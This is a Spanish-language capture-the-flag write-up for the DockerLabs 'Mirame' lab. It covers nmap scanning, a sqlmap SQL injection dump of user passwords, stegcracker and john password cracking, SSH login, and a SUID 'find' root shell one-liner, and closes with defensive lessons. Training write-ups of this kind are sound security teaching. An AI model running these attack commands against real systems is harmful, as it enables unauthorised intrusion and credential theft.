# Mirame — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** maciiii__  
**Fecha de creación:** 12/08/2024  
**Técnicas:** SQLMap · Burp Suite · Steghide · Stegcracker · John · SSH · SUID · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [SQL Injection — extracción de usuarios](#2-sql-injection--extracción-de-usuarios)
3. [Enumeración web — directoriotravieso](#3-enumeración-web--directoriotravieso)
4. [Esteganografía — miramebien.jpg](#4-esteganografía--miramebienjpg)
5. [Acceso SSH](#5-acceso-ssh)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos el laboratorio:

```bash
sudo bash auto_deploy.sh mirame.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

El servicio web contiene un formulario de login.

---

## 2. SQL Injection — extracción de usuarios

Interceptamos la petición con Burp Suite y guardamos la request:

```text
POST /auth.php HTTP/1.1
```

Utilizamos SQLMap para enumerar bases de datos:

```bash
sqlmap -r req.req --batch --dbs
```

Bases encontradas:

```text
information_schema
users
```

Enumeramos tablas:

```bash
sqlmap -r req.req --batch -D users --tables
```

Resultado:

```text
usuarios
```

Enumeramos columnas:

```bash
sqlmap -r req.req --batch -D users -T usuarios --columns
```

Columnas encontradas:

```text
id
password
username
```

Extraemos los datos:

```bash
sqlmap -r req.req --batch -D users -T usuarios --dump
```

Resultado:

```text
admin : chocolateadministrator
lucas : lucas
agustin : soyagustin123
directorio : directoriotravieso
```

---

## 3. Enumeración web — directoriotravieso

Probamos el nombre encontrado como directorio web:

```text
http://172.17.0.2/directoriotravieso/
```

Encontramos:

```text
miramebien.jpg
```

Descargamos la imagen para analizarla.

---

## 4. Esteganografía — miramebien.jpg

Intentamos extraer información:

```bash
steghide extract -sf miramebien.jpg
```

La imagen requiere contraseña.

Realizamos fuerza bruta con Stegcracker:

```bash
stegcracker miramebien.jpg /usr/share/wordlists/rockyou.txt
```

Resultado:

```text
password: chocolate
```

Extraemos nuevamente:

```bash
steghide extract -sf miramebien.jpg
```

Se genera:

```text
ocultito.zip
```

El ZIP también tiene contraseña.

Extraemos el hash:

```bash
zip2john ocultito.zip > password.hash
```

Crackeamos con John:

```bash
john password.hash
```

Resultado:

```text
carlos:carlitos
```

---

## 5. Acceso SSH

Accedemos al sistema:

```bash
ssh carlos@172.17.0.2
```

Contraseña:

```text
carlitos
```

---

## 6. Escalada de privilegios

Comprobamos sudo:

```bash
sudo -l
```

No existen permisos sudo útiles.

Buscamos binarios SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Encontramos:

```text
/usr/bin/find
```

Consultamos GTFOBins y ejecutamos:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| SQL Injection | Extracción de usuarios |
| Información sensible en base de datos | Descubrimiento de recursos |
| Esteganografía insegura | Exposición de credenciales |
| Contraseñas débiles | Acceso SSH |
| Binario SUID vulnerable | Escalada a root |

**Para defenderse:**

- Validar correctamente entradas SQL.
- No almacenar credenciales sensibles sin protección.
- Evitar ocultar secretos mediante esteganografía simple.
- Aplicar políticas robustas de contraseñas.
- Auditar binarios SUID peligrosos.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
